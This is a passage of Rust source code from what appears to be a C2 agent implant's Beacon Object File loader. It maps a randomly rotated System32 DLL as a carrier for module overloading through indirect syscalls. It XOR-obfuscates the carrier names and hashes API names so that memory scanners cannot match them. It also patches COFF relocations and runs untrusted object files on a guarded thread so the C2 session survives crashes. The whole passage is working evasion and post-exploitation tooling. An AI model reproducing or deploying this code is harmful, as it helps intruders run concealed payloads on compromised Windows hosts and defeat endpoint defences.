        tracef(&format!("overload: NtOpenFile status=0x{:X}", status as u32));

        if status as i32 != 0 {
            // STATUS_SUCCESS is 0
            return Err(BofError::syscall_failed("NtOpenFile", status));
        }

        // 3. NtCreateSection (SEC_IMAGE)
        let mut h_section: HANDLE = NULL;
        let hash_nt_create_section = crate::stealth::hash_api_name(b"NtCreateSection");
        tracef("overload: NtCreateSection begin");
        let status = crate::syscalls::indirect_syscall(
            hash_nt_create_section,
            &[
                &mut h_section as *mut _ as usize,
                (SECTION_MAP_READ | SECTION_MAP_EXECUTE) as usize,
                std::ptr::null_mut::<usize>() as usize, // ObjectAttributes
                std::ptr::null_mut::<usize>() as usize, // MaximumSize
                PAGE_READONLY as usize,
                SEC_IMAGE as usize,
                h_file as usize,
            ],
        );
        tracef(&format!("overload: NtCreateSection status=0x{:X}", status as u32));

        if status as i32 != 0 {
            let _ = crate::syscalls::indirect_syscall(
                crate::stealth::hash_api_name(b"NtClose"),
                &[h_file as usize],
            );
            return Err(BofError::syscall_failed("NtCreateSection", status));
        }

        // 4. NtMapViewOfSection
        let mut base_addr: usize = 0;
        let mut view_size: usize = 0;
        let hash_nt_map_view = crate::stealth::hash_api_name(b"NtMapViewOfSection");
        tracef("overload: NtMapViewOfSection begin");
        let status = crate::syscalls::indirect_syscall(
            hash_nt_map_view,
            &[
                h_section as usize,
                0xFFFFFFFFFFFFFFFFu64 as usize, // NtCurrentProcess
                &mut base_addr as *mut _ as usize,
                0, // ZeroBits
                0, // CommitSize
                0, // SectionOffset
                &mut view_size as *mut _ as usize,
                1, // ViewShare (InheritDisposition)
                0, // AllocationType
                PAGE_READONLY as usize,
            ],
        );

        // Cleanup handles
        let _ = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtClose"),
            &[h_section as usize],
        );
        let _ = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtClose"),
            &[h_file as usize],
        );

        if status as i32 != 0 {
            return Err(BofError::syscall_failed("NtMapViewOfSection", status));
        }
        tracef(&format!(
            "overload: NtMapViewOfSection ok base=0x{:X} size=0x{:X}",
            base_addr, view_size
        ));

        Ok(base_addr)
    }

    /// XOR key for carrier name blobs (compile-time obfuscation only —
    /// keeps the known carrier list out of static strings).
    const CARRIER_KEY: u8 = 0x5A;

    const fn obf<const N: usize>(s: &[u8; N]) -> [u8; N] {
        let mut out = [0u8; N];
        let mut i = 0;
        while i < N {
            out[i] = s[i] ^ Self::CARRIER_KEY;
            i += 1;
        }
        out
    }

    /// Carrier DLL name blobs (decoded on the stack at use time).
    const CARRIER_DLLS: [&[u8]; 5] = [
        &Self::obf(b"version.dll"),
        &Self::obf(b"dbghelp.dll"),
        &Self::obf(b"wer.dll"),
        &Self::obf(b"netapi32.dll"),
        &Self::obf(b"xpsprint.dll"),
    ];

    /// Obfuscated NT path prefixes (System32 / SysWOW64).
    const CARRIER_DIR_X64: &[u8] = &Self::obf(b"\\??\\C:\\Windows\\System32\\");
    const CARRIER_DIR_X86: &[u8] = &Self::obf(b"\\??\\C:\\Windows\\SysWOW64\\");

    fn decode_blob(blob: &[u8]) -> String {
        blob.iter().map(|b| (b ^ Self::CARRIER_KEY) as char).collect()
    }

    /// Candidate carrier DLLs for module overloading (rotated at runtime).
    fn carrier_candidates(wow64: bool) -> Vec<String> {
        let dir = Self::decode_blob(if wow64 {
            Self::CARRIER_DIR_X86
        } else {
            Self::CARRIER_DIR_X64
        });
        Self::CARRIER_DLLS
            .iter()
            .map(|blob| format!("{dir}{}", Self::decode_blob(blob)))
            .collect()
    }

    /// Map a randomly rotated carrier DLL; try next candidates on failure.
    fn map_rotated_carrier(wow64: bool) -> BofResult<usize> {
        let list = Self::carrier_candidates(wow64);
        if list.is_empty() {
            return Err(BofError::MemoryAllocationFailed(
                "no host candidates".to_string(),
            ));
        }
        let start = crate::utils::random_range(0, (list.len() - 1) as u32) as usize;
        let mut last_err = BofError::MemoryAllocationFailed("host map failed".to_string());
        for i in 0..list.len() {
            let path = list[(start + i) % list.len()].as_str();
            match unsafe { Self::module_overload_map(path) } {
                Ok(base) => {
                    debug!("[+] host image mapped @ 0x{:X}", base);
                    return Ok(base);
                }
                Err(e) => {
                    last_err = e;
                }
            }
        }
        Err(last_err)
    }

    /// Pure helper: validate reloc symbol index against symbol table length.
    #[inline]
    pub fn reloc_symbol_index_in_bounds(index: u32, symbol_count: usize) -> bool {
        (index as usize) < symbol_count
    }

    /// Resolve an external / internal-API symbol to a **function VA**.
    fn resolve_symbol_fn(name: &str) -> usize {
        if let Some(rest) = name.strip_prefix("__imp_") {
            // __imp_X / __imp__X — check internal table first, then imports
            if Self::is_internal_api_name(rest) {
                return Self::resolve_internal_beacon(rest);
            }
            return Self::resolve_external(name);
        }
        if Self::is_internal_api_name(name) {
            return Self::resolve_internal_beacon(name);
        }
        Self::resolve_external(name)
    }

    /// 核心符号修复逻辑 (Symbol Patching) - x64 版本
    unsafe fn patch_symbols(
        section_base: *mut u8,
        relocs: &[CoffRelocation],
        symbols: &[CoffSymbol],
        string_table: *const u8,
        section_map: &std::collections::HashMap<u16, usize, NoTlsHasher>,
        iat: &mut IatTable,
    ) {
        for reloc in relocs {
            let idx = reloc.symbol_table_index as usize;
            if idx >= symbols.len() {
                warn!(
                    "[!] reloc symbol index {} out of bounds (len={})",
                    idx,
                    symbols.len()
                );
                continue;
            }
            let symbol = &symbols[idx];
            let name = Self::get_symbol_name(symbol, string_table);

            let target_addr = if symbol.section_number > 0 {
                // Internal section ref (prefer over import even if named __imp_*)
                let base = *section_map
                    .get(&(symbol.section_number as u16))
                    .unwrap_or(&0);
                if base == 0 {
                    continue;
                }
                base + symbol.value as usize
            } else if name.starts_with("__imp_") {
                // Indirect import: reloc target = address of IAT slot holding fn VA
                let fn_addr = Self::resolve_symbol_fn(&name);
                if fn_addr == 0 {
                    crate::db_print!("[bof][!] UNRESOLVED import: {}", name);
                    continue;
                }
                let slot = iat.slot_for(&name, fn_addr);
                if slot == 0 {
                    crate::db_print!("[bof][!] IAT slot alloc failed: {}", name);
                    continue;
                }
                crate::db_print!(
                    "[bof] import {} fn=0x{:X} slot=0x{:X}",
                    name, fn_addr, slot
                );
                slot
            } else if Self::is_internal_api_name(&name) {
                // Direct internal API reference (patched as fn VA, no IAT slot)
                Self::resolve_symbol_fn(&name)
            } else {
                // Other undefined symbols — try as import; use IAT for safety
                let fn_addr = Self::resolve_symbol_fn(&name);
                if fn_addr == 0 {
                    0
                } else if name.contains('$') || name.starts_with('_') {
                    // MODULE$API style often used as direct; still prefer IAT for consistency
                    iat.slot_for(&name, fn_addr)
                } else {
                    fn_addr
                }
            };

            if target_addr == 0 {
                continue;
            }

            let patch_addr = section_base.add(reloc.virtual_address as usize);
            let reloc_type = reloc.typ;

            match reloc_type {
                IMAGE_REL_AMD64_REL32
                | IMAGE_REL_AMD64_REL32_1
                | IMAGE_REL_AMD64_REL32_2
                | IMAGE_REL_AMD64_REL32_3
                | IMAGE_REL_AMD64_REL32_4
                | IMAGE_REL_AMD64_REL32_5 => {
                    // type 4 → extra 0; type 5 → extra 1; … type 9 → extra 5
                    let extra = (reloc_type as isize) - (IMAGE_REL_AMD64_REL32 as isize);
                    // COFF implicit addend lives in the field itself (e.g.
                    // section-symbol refs like .data+0x10). Overwriting it
                    // drops the offset, so fold it into the final disp.
                    let addend = *(patch_addr as *mut i32) as isize;
                    let offset =
                        addend + (target_addr as isize) - (patch_addr as isize) - 4 - extra;
                    if offset > i32::MAX as isize || offset < i32::MIN as isize {
                        crate::db_print!(
                            "[bof][!] REL32 OUT OF RANGE: patch=0x{:X} target=0x{:X} disp=0x{:X}",
                            patch_addr as usize, target_addr, offset as usize
                        );
                    }
                    *(patch_addr as *mut i32) = offset as i32;
                }
                IMAGE_REL_AMD64_ADDR64 => {
                    *(patch_addr as *mut u64) = target_addr as u64;
                }
                IMAGE_REL_AMD64_ADDR32 => {
                    *(patch_addr as *mut u32) = target_addr as u32;
                }
                IMAGE_REL_AMD64_ADDR32NB => {
                    warn!("[!] IMAGE_REL_AMD64_ADDR32NB not fully supported");
                }
                _ => {
                    warn!("[!] Unknown x64 relocation type: {}", reloc_type);
                }
            }
        }
    }

    /// 核心符号修复逻辑 (Symbol Patching) - x86 版本
    unsafe fn patch_symbols_x86(
        section_base: *mut u8,
        relocs: &[CoffRelocation],
        symbols: &[CoffSymbol],
        string_table: *const u8,
        section_map: &std::collections::HashMap<u16, usize, NoTlsHasher>,
        iat: &mut IatTable,
    ) {
        for reloc in relocs {
            let idx = reloc.symbol_table_index as usize;
            if idx >= symbols.len() {
                warn!(
                    "[!] reloc symbol index {} out of bounds (len={})",
                    idx,
                    symbols.len()
                );
                continue;
            }
            let symbol = &symbols[idx];
            let name = Self::get_symbol_name(symbol, string_table);

            let target_addr = if symbol.section_number > 0 {
                let base = *section_map
                    .get(&(symbol.section_number as u16))
                    .unwrap_or(&0);
                if base == 0 {
                    continue;
                }
                base + symbol.value as usize
            } else if name.starts_with("__imp_") {
                let fn_addr = Self::resolve_symbol_fn(&name);
                if fn_addr == 0 {
                    continue;
                }
                iat.slot_for(&name, fn_addr)
            } else if Self::is_internal_api_name(&name) {
                Self::resolve_symbol_fn(&name)
            } else {
                Self::resolve_symbol_fn(&name)
            };

            if target_addr == 0 {
                continue;
            }

            let patch_addr = section_base.add(reloc.virtual_address as usize);

            match reloc.typ {
                IMAGE_REL_I386_DIR32 => {
                    *(patch_addr as *mut u32) = target_addr as u32;
                }
                IMAGE_REL_I386_REL32 => {
                    let addend = *(patch_addr as *mut i32) as isize;
                    let offset = addend + (target_addr as isize) - (patch_addr as isize) - 4;
                    *(patch_addr as *mut i32) = offset as i32;
                }
                IMAGE_REL_I386_DIR32NB => {
                    warn!("[!] IMAGE_REL_I386_DIR32NB not fully supported");
                }
                _ => {
                    let reloc_type = reloc.typ;
                    warn!("[!] Unknown x86 relocation type: {}", reloc_type);
                }
            }
        }
    }

    /// 解析外部符号
    /// 支持多种符号格式:
    /// 1. MODULE$API - 自定义格式 (例如: KERNEL32$CreateFileW)
    /// 2. __imp_API - 标准 COFF 格式 (例如: __imp_CreateFileW)
    /// 3. __imp__API@N - stdcall 调用约定 (例如: __imp__CreateFileW@12)
    fn resolve_external(name: &str) -> usize {
        // 检查缓存
        if let Ok(cache) = SYMBOL_CACHE.lock() {
            if let Some(&addr) = cache.get(name) {
                return addr;
            }
        }

        // 移除 __imp_ 前缀
        let clean_name = name.trim_start_matches("__imp_");

        // 格式 1: MODULE$API (自定义格式)
        if let Some(pos) = clean_name.find('$') {
            let module_name = &clean_name[..pos];
            let api_name = &clean_name[pos + 1..];

            unsafe {
                // BOF convention writes bare module names ("KERNEL32") while the PEB
                // BaseDllName carries the extension ("kernel32.dll") — try both hash
                // shapes. ensure_module_base also LoadLibrary's the DLL when it is not
                // mapped yet (e.g. msvcrt.dll in a minimal agent process).
                let mut h_module = crate::stealth::ensure_module_base(
                    module_name.as_bytes(),
                    crate::stealth::hash_module_name(module_name.as_bytes()),
                );
                if h_module == 0 {
                    let mut with_ext: Vec<u8> = Vec::with_capacity(module_name.len() + 4);
                    with_ext.extend_from_slice(module_name.as_bytes());
                    with_ext.extend_from_slice(b".dll");
                    h_module = crate::stealth::ensure_module_base(
                        &with_ext,
                        crate::stealth::hash_module_name(&with_ext),
                    );
                }
                if h_module != 0 {
                    if let Some(addr) = crate::stealth::get_api_addr(
                        h_module,
                        crate::stealth::hash_api_name(api_name.as_bytes()),
                    ) {
                        // 缓存结果
                        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                            cache.insert(name.to_string(), addr);
                        }
                        return addr;
                    }
                }
            }
        }

        // 格式 2 & 3: 标准 COFF 格式
        // 移除 stdcall 装饰符 (例如: _CreateFileW@12 -> CreateFileW)
        let api_name = if clean_name.starts_with('_') {
            // stdcall: _API@N
            let without_underscore = &clean_name[1..];
            if let Some(at_pos) = without_underscore.find('@') {
                &without_underscore[..at_pos]
            } else {
                without_underscore
            }
        } else {
            // cdecl: API
            clean_name
        };

        // 尝试在常见的系统 DLL 中查找
        let common_modules = [
            "KERNEL32.DLL",
            "NTDLL.DLL",
            "USER32.DLL",
            "ADVAPI32.DLL",
            "WS2_32.DLL",
            "MSVCRT.DLL",
        ];

        unsafe {
            for module in &common_modules {
                // ensure_module_base: PEB hit or LoadLibraryA (some DLLs, e.g. msvcrt,
                // may not be mapped in a minimal agent process yet).
                let h_module = crate::stealth::ensure_module_base(
                    module.as_bytes(),
                    crate::stealth::hash_module_name(module.as_bytes()),
                );
                if h_module != 0 {
                    // 尝试原始名称
                    if let Some(addr) = crate::stealth::get_api_addr(
                        h_module,
                        crate::stealth::hash_api_name(api_name.as_bytes()),
                    ) {
                        debug!("[+] Resolved {} -> 0x{:X} (from {})", name, addr, module);
                        // 缓存结果
                        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                            cache.insert(name.to_string(), addr);
                        }
                        return addr;
                    }

                    // 尝试添加 A 后缀 (ANSI 版本)
                    let ansi_name = format!("{}A", api_name);
                    if let Some(addr) = crate::stealth::get_api_addr(
                        h_module,
                        crate::stealth::hash_api_name(ansi_name.as_bytes()),
                    ) {
                        debug!(
                            "[+] Resolved {} -> 0x{:X} (from {}, ANSI)",
                            name, addr, module
                        );
                        // 缓存结果
                        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                            cache.insert(name.to_string(), addr);
                        }
                        return addr;
                    }

                    // 尝试添加 W 后缀 (Unicode 版本)
                    let wide_name = format!("{}W", api_name);
                    if let Some(addr) = crate::stealth::get_api_addr(
                        h_module,
                        crate::stealth::hash_api_name(wide_name.as_bytes()),
                    ) {
                        debug!(
                            "[+] Resolved {} -> 0x{:X} (from {}, Unicode)",
                            name, addr, module
                        );
                        // 缓存结果
                        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                            cache.insert(name.to_string(), addr);
                        }
                        return addr;
                    }
                }
            }
        }

        warn!("[!] Failed to resolve external symbol: {}", name);
        // 缓存失败结果 (避免重复查找)
        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
            cache.insert(name.to_string(), 0);
        }
        0
    }

    // ── Signature erasure (P0) ──────────────────────────────────────────────
    // Internal C2-agnostic BOF API names are compared by compile-time hash
    // (same 31-multiply scheme as stealth::hash_api_name). The b"..." inputs
    // below exist only during CTFE — they never land in .rdata, so memory
    // scanners cannot match known loader API names inside the mapped module.
    const H_API_PRINTF: u32 = crate::stealth::hash_api_name(b"BeaconPrintf");
    const H_API_OUTPUT: u32 = crate::stealth::hash_api_name(b"BeaconOutput");
    const H_API_DATA_PARSE: u32 = crate::stealth::hash_api_name(b"BeaconDataParse");
    const H_API_DATA_INT: u32 = crate::stealth::hash_api_name(b"BeaconDataInt");
    const H_API_DATA_SHORT: u32 = crate::stealth::hash_api_name(b"BeaconDataShort");
    const H_API_DATA_LENGTH: u32 = crate::stealth::hash_api_name(b"BeaconDataLength");
    const H_API_DATA_EXTRACT: u32 = crate::stealth::hash_api_name(b"BeaconDataExtract");
    const H_API_FMT_ALLOC: u32 = crate::stealth::hash_api_name(b"BeaconFormatAlloc");
    const H_API_FMT_RESET: u32 = crate::stealth::hash_api_name(b"BeaconFormatReset");
    const H_API_FMT_FREE: u32 = crate::stealth::hash_api_name(b"BeaconFormatFree");
    const H_API_FMT_APPEND: u32 = crate::stealth::hash_api_name(b"BeaconFormatAppend");
    const H_API_FMT_PRINTF: u32 = crate::stealth::hash_api_name(b"BeaconFormatPrintf");
    const H_API_FMT_TO_STRING: u32 = crate::stealth::hash_api_name(b"BeaconFormatToString");
    const H_API_FMT_INT: u32 = crate::stealth::hash_api_name(b"BeaconFormatInt");

    /// True when `name` (after trimming leading underscores) hashes to a known
    /// internal API — replaces the legacy prefix-string check.
    fn is_internal_api_name(name: &str) -> bool {
        Self::resolve_internal_beacon(name) != 0
    }

    fn resolve_internal_beacon(name: &str) -> usize {
        let clean = name.trim_start_matches('_');
        let h = crate::stealth::hash_api_name(clean.as_bytes());
        match h {
            // base output
            Self::H_API_PRINTF => beacon_api::BeaconPrintf as *const () as usize,
            Self::H_API_OUTPUT => beacon_api::BeaconOutput as *const () as usize,
            // data parsing
            Self::H_API_DATA_PARSE => beacon_api::BeaconDataParse as *const () as usize,
            Self::H_API_DATA_INT => beacon_api::BeaconDataInt as *const () as usize,
            Self::H_API_DATA_SHORT => beacon_api::BeaconDataShort as *const () as usize,
            Self::H_API_DATA_LENGTH => beacon_api::BeaconDataLength as *const () as usize,
            Self::H_API_DATA_EXTRACT => beacon_api::BeaconDataExtract as *const () as usize,
            // format buffers
            Self::H_API_FMT_ALLOC => beacon_api::BeaconFormatAlloc as *const () as usize,
            Self::H_API_FMT_RESET => beacon_api::BeaconFormatReset as *const () as usize,
            Self::H_API_FMT_FREE => beacon_api::BeaconFormatFree as *const () as usize,
            Self::H_API_FMT_APPEND => beacon_api::BeaconFormatAppend as *const () as usize,
            Self::H_API_FMT_PRINTF => beacon_api::BeaconFormatPrintf as *const () as usize,
            Self::H_API_FMT_TO_STRING => beacon_api::BeaconFormatToString as *const () as usize,
            Self::H_API_FMT_INT => beacon_api::BeaconFormatInt as *const () as usize,
            _ => 0,
        }
    }

    unsafe fn get_symbol_name(sym: &CoffSymbol, str_table: *const u8) -> String {
        if sym.name[0] == 0 && sym.name[1] == 0 && sym.name[2] == 0 && sym.name[3] == 0 {
            let offset = u32::from_le_bytes([sym.name[4], sym.name[5], sym.name[6], sym.name[7]]);
            std::ffi::CStr::from_ptr(str_table.add(offset as usize) as *const i8)
                .to_string_lossy()
                .into_owned()
        } else {
            String::from_utf8_lossy(&sym.name)
                .trim_matches('\0')
                .to_string()
        }
    }
}

/// Map/reloc stage is PAGE_READWRITE; go() uses PAGE_EXECUTE_READWRITE when
/// data is co-located (classic BOF). Pure RX remains the long-term ideal.
pub fn bof_protect_stages() -> (u32, u32) {
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    (PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
}

// ── BOF crash isolation ─────────────────────────────────────────────────────
// Untrusted COFF runs in-process. Map/reloc/`go()` faults (classic dir.x64
// empty-args → msvcrt AV) must not APPCRASH the agent. Scoped VEH + dedicated
// OS thread: on fatal exception we ExitThread the BOF worker only; the agent
// WaitForSingleObject path returns Err and keeps the C2 session alive.

#[cfg(windows)]
mod bof_seh {
    use std::sync::atomic::{AtomicU32, Ordering};

    /// Thread id currently inside the BOF worker (0 = none).
    static BOF_TID: AtomicU32 = AtomicU32::new(0);
    /// Exception code captured by the VEH (0 = clean return).
    static BOF_FAULT: AtomicU32 = AtomicU32::new(0);

    const EXCEPTION_ACCESS_VIOLATION: u32 = 0xC000_0005;
    const EXCEPTION_ILLEGAL_INSTRUCTION: u32 = 0xC000_001D;
    const EXCEPTION_STACK_OVERFLOW: u32 = 0xC000_00FD;
    const EXCEPTION_INT_DIVIDE_BY_ZERO: u32 = 0xC000_0094;
    const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
    const WAIT_MS: u32 = 120_000;
    const WAIT_TIMEOUT: u32 = 0x0000_0102;
    const WAIT_OBJECT_0: u32 = 0;
    const FAULT_EXIT_MARK: u32 = 0xE0BF_0000;

    #[repr(C)]
    struct GoArgs {
        entry: usize,
        args: *const u8,
        len: i32,
    }

    /// Heap job for full map+reloc+go isolation (Send closure result).
    struct JobBox {
        func: Option<Box<dyn FnOnce() -> Result<String, String> + Send>>,
        result: Option<Result<String, String>>,
    }

    unsafe extern "system" fn veh_handler(
        info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
    ) -> i32 {
        if info.is_null() {
            return EXCEPTION_CONTINUE_SEARCH;
        }
        let tid = winapi::um::processthreadsapi::GetCurrentThreadId();
        if tid != BOF_TID.load(Ordering::SeqCst) {
            return EXCEPTION_CONTINUE_SEARCH;
        }
        let rec = (*info).ExceptionRecord;
        if rec.is_null() {
            return EXCEPTION_CONTINUE_SEARCH;
        }
        let code = (*rec).ExceptionCode;
        let fatal = matches!(
            code,
            EXCEPTION_ACCESS_VIOLATION
                | EXCEPTION_ILLEGAL_INSTRUCTION
                | EXCEPTION_STACK_OVERFLOW
                | EXCEPTION_INT_DIVIDE_BY_ZERO
                | 0xC000_0005 // belt
        );
        if !fatal {
            return EXCEPTION_CONTINUE_SEARCH;
        }
        BOF_FAULT.store(code, Ordering::SeqCst);
        BOF_TID.store(0, Ordering::SeqCst);
        // Terminate only this worker thread — agent process stays up.
        winapi::um::processthreadsapi::ExitThread(FAULT_EXIT_MARK | (code & 0xFFFF));
        // unreachable
        #[allow(unreachable_code)]
        EXCEPTION_CONTINUE_SEARCH
    }

    unsafe extern "system" fn go_thread(param: winapi::shared::minwindef::LPVOID) -> u32 {
        let ga = &*(param as *const GoArgs);
        BOF_TID.store(
            winapi::um::processthreadsapi::GetCurrentThreadId(),
            Ordering::SeqCst,
        );
        BOF_FAULT.store(0, Ordering::SeqCst);
        let go: extern "C" fn(*const u8, i32) = std::mem::transmute(ga.entry);
        go(ga.args, ga.len);
        BOF_TID.store(0, Ordering::SeqCst);
        0
    }

    unsafe extern "system" fn job_thread(param: winapi::shared::minwindef::LPVOID) -> u32 {
        let job = &mut *(param as *mut JobBox);
        BOF_TID.store(
            winapi::um::processthreadsapi::GetCurrentThreadId(),
            Ordering::SeqCst,
        );
        BOF_FAULT.store(0, Ordering::SeqCst);
        if let Some(f) = job.func.take() {
            job.result = Some(f());
        } else {
            job.result = Some(Err("bof job: empty func".into()));
        }
        BOF_TID.store(0, Ordering::SeqCst);
        0
    }

    fn fault_message(prefix: &str, fault: u32, exit_code: u32) -> String {
        let code = if fault != 0 {
            fault
        } else {
            0xC000_0000 | (exit_code & 0xFFFF)
        };
        format!(
            "{prefix} fault exception=0x{code:08X} (agent survived; check args — empty path AVs in msvcrt on dir.x64)"
        )
    }

    /// Run the full BOF map/reloc/`go` pipeline on a dedicated OS thread under VEH.
    pub fn run_isolated_job<F>(f: F) -> Result<String, String>
    where
        F: FnOnce() -> Result<String, String> + Send + 'static,
    {
        let mut job = Box::new(JobBox {
            func: Some(Box::new(f)),
            result: None,
        });
        let job_ptr = &mut *job as *mut JobBox;

        unsafe {
            BOF_FAULT.store(0, Ordering::SeqCst);
            let veh = winapi::um::errhandlingapi::AddVectoredExceptionHandler(1, Some(veh_handler));
            let h = winapi::um::processthreadsapi::CreateThread(
                std::ptr::null_mut(),
                0,
                Some(job_thread),
                job_ptr as *mut _,
                0,
                std::ptr::null_mut(),
            );
            if h.is_null() {
                if !veh.is_null() {
                    winapi::um::errhandlingapi::RemoveVectoredExceptionHandler(veh);
                }
                // Fallback: run inline without isolation
                return f_inline(job);
            }
            let wr = winapi::um::synchapi::WaitForSingleObject(h, WAIT_MS);
            let mut exit_code: u32 = 0;
            let _ = winapi::um::processthreadsapi::GetExitCodeThread(h, &mut exit_code);
            winapi::um::handleapi::CloseHandle(h);
            if !veh.is_null() {
                winapi::um::errhandlingapi::RemoveVectoredExceptionHandler(veh);
            }
            BOF_TID.store(0, Ordering::SeqCst);

            if wr == WAIT_TIMEOUT {
                return Err("bof job timed out (120s)".into());
            }
            if wr != WAIT_OBJECT_0 {
                return Err(format!("bof job wait failed 0x{wr:X}"));
            }
            let fault = BOF_FAULT.load(Ordering::SeqCst);
            if fault != 0 || (exit_code & 0xFFFF_0000) == FAULT_EXIT_MARK {
                return Err(fault_message("bof job", fault, exit_code));
            }
            if exit_code != 0 {
                return Err(format!("bof job thread exit=0x{exit_code:X}"));
            }
            job.result.take().unwrap_or_else(|| Err("bof job: no result".into()))
        }
    }

    fn f_inline(mut job: Box<JobBox>) -> Result<String, String> {
        if let Some(f) = job.func.take() {
            f()
        } else {
            Err("bof job: empty func".into())
        }
    }

    /// Invoke BOF `go` entry. If already on the isolated BOF worker, call
    /// directly (outer job already owns VEH). Otherwise spawn a nested worker.
    pub unsafe fn invoke(entry: usize, args: *const u8, len: i32) -> Result<(), String> {
        if entry == 0 {
            return Err("null entry".into());
        }
        let cur = winapi::um::processthreadsapi::GetCurrentThreadId();
        if cur == BOF_TID.load(Ordering::SeqCst) && cur != 0 {
            // Already inside run_isolated_job — direct call, VEH already armed.
            let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry);
            go(args, len);
            return Ok(());
        }

        let ga = GoArgs { entry, args, len };
        BOF_FAULT.store(0, Ordering::SeqCst);

        let veh = winapi::um::errhandlingapi::AddVectoredExceptionHandler(1, Some(veh_handler));
        let h = winapi::um::processthreadsapi::CreateThread(
            std::ptr::null_mut(),
            0,
            Some(go_thread),
            &ga as *const GoArgs as *mut _,
            0,
            std::ptr::null_mut(),
        );
        if h.is_null() {
            if !veh.is_null() {
                winapi::um::errhandlingapi::RemoveVectoredExceptionHandler(veh);
            }
            // Fallback: direct call (no isolation)
            let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry);
            go(args, len);
            return Ok(());
        }
        // Generous wall clock: dir /s on large trees can take a while.
        let wr = winapi::um::synchapi::WaitForSingleObject(h, WAIT_MS);
        let mut exit_code: u32 = 0;
        let _ = winapi::um::processthreadsapi::GetExitCodeThread(h, &mut exit_code);
        winapi::um::handleapi::CloseHandle(h);
        if !veh.is_null() {
            winapi::um::errhandlingapi::RemoveVectoredExceptionHandler(veh);
        }
        BOF_TID.store(0, Ordering::SeqCst);

        if wr == WAIT_TIMEOUT {
            return Err("bof go() timed out (120s)".into());
        }
        if wr != WAIT_OBJECT_0 {
            return Err(format!("bof go() wait failed 0x{wr:X}"));
        }
        let fault = BOF_FAULT.load(Ordering::SeqCst);
        if fault != 0 || (exit_code & 0xFFFF_0000) == FAULT_EXIT_MARK {
            return Err(fault_message("bof go()", fault, exit_code));
        }
        if exit_code != 0 {
            // Non-zero but not our marker — unusual; treat as soft failure.
            return Err(format!("bof go() thread exit=0x{exit_code:X}"));
        }
        Ok(())
    }
}

#[cfg(windows)]
unsafe fn invoke_bof_go_guarded(entry: usize, args: *const u8, len: i32) -> Result<(), String> {
    bof_seh::invoke(entry, args, len)
}

#[cfg(not(windows))]
unsafe fn invoke_bof_go_guarded(entry: usize, args: *const u8, len: i32) -> Result<(), String> {
    let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry);
    go(args, len);
    Ok(())
}

#[cfg(test)]
mod reloc_bounds_tests {
    use super::BofLoader;

    #[test]
    fn symbol_index_bounds_helper() {
        assert!(BofLoader::reloc_symbol_index_in_bounds(0, 1));
        assert!(BofLoader::reloc_symbol_index_in_bounds(2, 3));
        assert!(!BofLoader::reloc_symbol_index_in_bounds(3, 3));
        assert!(!BofLoader::reloc_symbol_index_in_bounds(0, 0));
        assert!(!BofLoader::reloc_symbol_index_in_bounds(u32::MAX, 1));
    }

    #[test]
    fn carrier_list_not_only_xpsprint() {
        let cands = BofLoader::carrier_candidates(false);
        assert!(cands.len() >= 3);
        assert!(cands.iter().any(|p| p.contains("version.dll")));
        // xpsprint may remain as last-resort fallback but must not be the only option
        assert!(cands.iter().any(|p| !p.contains("xpsprint")));
    }

    #[test]
    fn bof_protect_stages_document_rw_and_exec() {
        let (rw, exec) = super::bof_protect_stages();
        assert_eq!(rw, 0x04); // PAGE_READWRITE for map/reloc
        // Final go() uses EXECUTE_READWRITE when .data shares the carrier page;
        // pure RX (0x20) is only a fallback for code-only BOFs.
        assert!(exec == 0x20 || exec == 0x40);
    }
}
